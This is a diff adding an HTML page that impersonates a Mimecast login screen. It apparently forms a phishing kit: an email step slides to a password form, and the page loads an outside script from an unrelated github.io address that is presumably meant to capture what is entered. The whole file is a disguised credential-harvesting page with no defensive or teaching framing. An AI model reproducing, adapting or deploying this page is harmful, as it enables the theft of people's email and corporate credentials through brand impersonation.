@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Mimecast Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+  margin:0;
+  background:#1f78d1;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  overflow:hidden;
+}
+
+/* ===== LOGO ===== */
+.logo-bar{
+  width:100%;
+  padding:28px 0;
+  text-align:center;
+}
+
+.logo{
+  font-size:36px;
+  font-weight:800;
+  color:white;
+  letter-spacing:1px;
+}
+
+/* ===== CARD PAGES ===== */
+.page{
+  width:92%;
+  max-width:370px;
+  background:#fff;
+  border-radius:10px;
+  padding:22px;
+  box-shadow:0 6px 25px rgba(0,0,0,0.15);
+  position:absolute;
+  top:110px;
+  transition:0.4s ease;
+}
+
+#page2{
+  transform:translateX(120%);
+}
+
+/* ===== FORM ===== */
+h2{
+  margin:0 0 16px;
+}
+
+label{
+  font-size:14px;
+  font-weight:600;
+  color:#333;
+  display:block;
+  margin-bottom:6px;
+}
+
+input, select{
+  width:100%;
+  padding:12px;
+  font-size:14px;
+  border-radius:6px;
+  border:1px solid #ccc;
+  margin-bottom:16px;
+}
+
+input:focus, select:focus{
+  outline:none;
+  border-color:#1f78d1;
+}
+
+/* ✅ BUTTON STATES */
+button{
+  width:100%;
+  padding:12px;
+  border:none;
+  border-radius:6px;
+  font-size:15px;
+  font-weight:700;
+  color:white;
+  background:#9fc4eb;   /* 🔒 Locked color */
+  cursor:not-allowed;
+  transition:0.3s;
+}
+
+button.active{
+  background:#1f78d1;   /* ✅ Active strong blue */
+  cursor:pointer;
+}
+
+.links{
+  margin-top:14px;
+}
+
+.links a{
+  color:#1f78d1;
+  font-size:13px;
+  text-decoration:none;
+  display:block;
+  margin-top:6px;
+}
+
+/* ===== FOOTER ===== */
+.footer{
+  color:white;
+  font-size:13px;
+  margin-top:420px;
+  text-align:center;
+  opacity:0.8;
+}
+</style>
+</head>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<body>
+
+<div class="logo-bar">
+  <div class="logo">mimecast</div>
+</div>
+
+<!-- ✅ PAGE 1 -->
+<div class="page" id="page1">
+  <h2>Log In</h2>
+
+  <label>Email Address</label>
+  <input type="email" id="emailInput" placeholder="Email Address">
+
+  <button id="nextBtn" disabled>Next</button>
+</div>
+
+<!-- ✅ PAGE 2 -->
+<div class="page" id="page2">
+  <h2>Log In</h2>
+<form>
+  <label>Email Address</label>
+  <input type="email" id="emailDisplay" readonly name="Email">
+
+  <label>Authentication Type</label>
+  <select name="selected">
+    <option>Cloud</option>
+    <option>Domain</option>
+  </select>
+
+  <label>Password</label>
+  <input type="password" placeholder="Password" name="Password" required>
+
+  <button class="active" type="submit">Log In</button>
+
+  <div class="links">
+    <a href="#">Log in as a different user.</a>
+    <a href="#">Reset Cloud Password</a>
+  </div>
+</div>
+</form>
+<div class="footer">
+  ©2025 Mimecast v1.17.0
+  <div>Privacy</div>
+</div>
+
+<!-- ✅ REAL LOGIC -->
+<script>
+const emailInput = document.getElementById("emailInput");
+const nextBtn = document.getElementById("nextBtn");
+const page1 = document.getElementById("page1");
+const page2 = document.getElementById("page2");
+const emailDisplay = document.getElementById("emailDisplay");
+
+emailInput.addEventListener("input", function() {
+  if (emailInput.value.includes("@") && emailInput.value.includes(".")) {
+    nextBtn.classList.add("active");
+    nextBtn.disabled = false;
+  } else {
+    nextBtn.classList.remove("active");
+    nextBtn.disabled = true;
+  }
+});
+
+nextBtn.addEventListener("click", function() {
+  emailDisplay.value = emailInput.value;
+
+  page1.style.transform = "translateX(-120%)";
+  page2.style.transform = "translateX(0)";
+});
+</script>
+
+</body>
+</html>
